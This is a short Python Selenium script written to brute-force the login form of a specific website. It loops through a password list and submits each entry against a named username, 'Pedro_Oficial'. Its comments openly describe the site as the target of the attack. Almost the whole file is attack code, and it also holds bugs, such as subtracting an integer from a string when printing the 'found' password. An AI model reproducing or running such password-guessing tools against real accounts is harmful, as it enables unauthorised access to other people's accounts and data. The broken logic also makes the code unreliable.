from selenium import webdriver
from selenium import *
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
import time

#giving path to firefox binary
binary = FirefoxBinary('/usr/lib/firefox/firefox')
#creating a webdriver variable 
browser = webdriver.Firefox(firefox_binary=binary)
#open an array to manage the passwords that will be test  
pass_word = []
#open password file 
with open('pass.txt') as my_file:
	#appending txt to the array
    for line in my_file:
        pass_word.append(line)
#open the website that will be attack 
browser.get('https://winfo.pt/trabalho/')
#testing all passwords
for i in range (0 , len(pass_word)):
	#try and cach to indicate if was found
	try:
		#timer to let space to the page became responsive again 
		time.sleep(0.01)
		#Giving first box credencials
		browser.find_element_by_name('nomeh').send_keys('Pedro_Oficial')
		#giving second box credentials 
		browser.find_element_by_name('passh').send_keys(pass_word[i])
		#testing input 
		browser.find_element_by_tag_name('button').click()
	#if we can't find this variables anymore 
	except:
		print('Password found: ' + (pass_word[i]-1))
		break
#print found password		
print('Password found: ' + (pass_word[i]-1))